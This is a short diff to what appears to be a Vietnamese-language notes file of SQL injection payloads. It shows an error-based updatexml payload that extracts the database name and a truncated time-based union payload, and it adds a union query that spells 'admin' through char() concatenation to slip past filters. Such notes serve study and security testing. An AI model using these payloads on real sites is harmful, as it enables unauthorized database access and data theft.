@@ -34,4 +34,6 @@ Time base: '1)) union select 1,2,elt((select substr('abc',1,1) from information_
 
 Sử dụng updateXML: 1',updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -
 
+select name from demo where name = 'dasd' union values(char(97)||char(100)||char(109)||char(105)||char(110))
+
 
